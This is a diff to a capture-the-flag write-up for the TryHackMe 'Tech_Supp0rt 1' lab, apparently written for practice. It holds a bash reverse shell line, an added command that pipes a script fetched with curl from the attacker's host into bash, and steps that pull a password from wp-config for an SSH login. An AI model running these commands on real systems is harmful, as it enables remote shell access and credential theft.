@@ -101,9 +101,20 @@ As we already know the username and the password, using this script will be no b
 
 ![python exploit](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Tech_Supp0rt%201/tech_supp0rt%201%20images/python%20exploit.png)
 
-Ideally we should have a better shell, as this one doesn't operate that great. I used a bash reverse shell for that, while hosting the shell code `bash -i >& /dev/tcp/IP/PORT 0>&1` on a local python webserver.
+Ideally we should have a better shell, as this one doesn't operate that great. I used a bash reverse shell for that, while hosting the shell code `bash -i >& /dev/tcp/IP/PORT 0>&1` on a local python webserver.\
+
+
+`curl <OUR IP>:8000/shell.sh | bash `
+
 
 ![rshell1](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Tech_Supp0rt%201/tech_supp0rt%201%20images/bash%20reverse%20shell.png)
 
+Now that we have a better shell we can run linpeas.sh from our computer:
+
+![lp](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Tech_Supp0rt%201/tech_supp0rt%201%20images/wp_config_PW.png)
+
+We have found suspicious info here. Remember user 'support'? Grab the PW and try to log in with SSH.
+
+![sshlogin](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Tech_Supp0rt%201/tech_supp0rt%201%20images/login%20to%20SSH.png)
 
 ##### author: Dániel Varkoly
